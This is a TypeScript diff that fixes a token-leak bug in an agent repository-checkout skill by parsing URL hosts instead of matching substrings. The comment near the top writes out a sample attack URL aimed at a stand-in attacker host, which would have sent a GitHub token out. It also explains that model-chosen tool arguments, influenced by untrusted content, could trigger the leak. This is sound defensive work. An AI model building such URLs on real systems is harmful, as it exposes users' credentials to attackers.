@@ -5,6 +5,43 @@ import { resolve, join, basename } from 'path';
 const DEFAULT_CHECKOUT_DIR = '.zibby/repos';
 
 /**
+ * Is `rawUrl` an https URL whose host is EXACTLY `host`?
+ *
+ * A substring test (`url.includes('github.com')`) is not good enough and was a
+ * live token-exfiltration bug: `https://github.com@attacker.example/x.git`
+ * contains the string "github.com", so the old code spliced the GitHub token in
+ * and produced
+ *   https://x-access-token:<TOKEN>@github.com@attacker.example/x.git
+ * whose REAL host is whatever follows the LAST `@` — attacker.example. git then
+ * sent the token there as basic auth. `url` reaches this code from a model-chosen
+ * tool argument, and the skill is exposed to agents that read untrusted content,
+ * so the host must be parsed, never matched.
+ *
+ * https-only on purpose: a token belongs in an https basic-auth URL and nowhere
+ * else (not http://, not ssh://, not git://).
+ */
+export function isHttpsHost(rawUrl: string, host: string): boolean {
+  try {
+    const u = new URL(rawUrl);
+    return u.protocol === 'https:' && u.host.toLowerCase() === host.toLowerCase();
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Return `rawUrl` with basic-auth credentials attached, built through the URL
+ * object rather than string replacement so the authority can never be rewritten
+ * by the input. Callers MUST have validated the host with isHttpsHost first.
+ */
+export function withCredentials(rawUrl: string, user: string, token: string): string {
+  const u = new URL(rawUrl);
+  u.username = encodeURIComponent(user);
+  u.password = encodeURIComponent(token);
+  return u.toString();
+}
+
+/**
  * Redact any VCS token (or the authenticated-URL userinfo) from a string before
  * it is returned to the model. Covers the literal token values this skill
  * embeds in clone URLs AND the generic `user:secret@host` / `x-access-token:...`
@@ -168,13 +205,13 @@ async function handleCheckout(args, cwd) {
   const glToken = process.env.GITLAB_TOKEN;
   const glUrl = process.env.GITLAB_URL;
 
-  if (url.includes('github.com') && ghToken) {
-    authUrl = url.replace('https://github.com', `https://x-access-token:${ghToken}@github.com`);
+  if (isHttpsHost(url, 'github.com') && ghToken) {
+    authUrl = withCredentials(url, 'x-access-token', ghToken);
   } else if (glToken && glUrl) {
     try {
       const host = new URL(glUrl).host;
-      if (url.includes(host)) {
-        authUrl = url.replace(`https://${host}`, `https://oauth2:${glToken}@${host}`);
+      if (isHttpsHost(url, host)) {
+        authUrl = withCredentials(url, 'oauth2', glToken);
       }
     } catch { /* use original */ }
   }
